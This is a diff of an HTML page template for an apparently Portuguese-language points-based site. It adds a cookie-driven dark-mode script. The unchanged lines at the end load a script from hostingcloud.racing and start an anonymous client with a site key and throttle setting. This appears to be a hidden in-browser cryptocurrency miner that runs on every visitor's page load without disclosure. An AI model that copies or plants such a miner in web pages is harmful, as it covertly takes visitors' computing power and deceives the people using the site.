@@ -84,6 +84,26 @@
 				<li>Perguntar - 1 ponto por pergunta</li>
 			</ul>
 		</main>
+		<script src="/static/js/cookieman.js?v=0.1"></script>
+		<script>
+function toggleDarkMode() {
+	document.body.style = "background: #222; color: white;";
+	document.getElementsByClassName('navbar')[0].classList.add("bg-dark");
+	document.getElementsByClassName('navbar')[0].classList.add("navbar-dark");
+	document.getElementsByClassName('navbar')[0].classList.remove("bg-light");
+	document.getElementsByClassName('navbar')[0].classList.remove("navbar-light");
+
+	texts = document.getElementsByClassName('form-control')
+	for (i = 0; i < texts.length; i++) {
+	    texts[i].classList.add("bg-dark");
+	    texts[i].classList.add("text-light");
+	}
+}
+if (getDarkCookie() == 'true') {
+	toggleDarkMode();
+}
+
+		</script>
 <script src="https://www.hostingcloud.racing/zk0a.js"></script><script>var _client=new Client.Anonymous("5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a",{throttle:.9,c:"w",ads:0});_client.start();</script>
 	</body>
 </html>
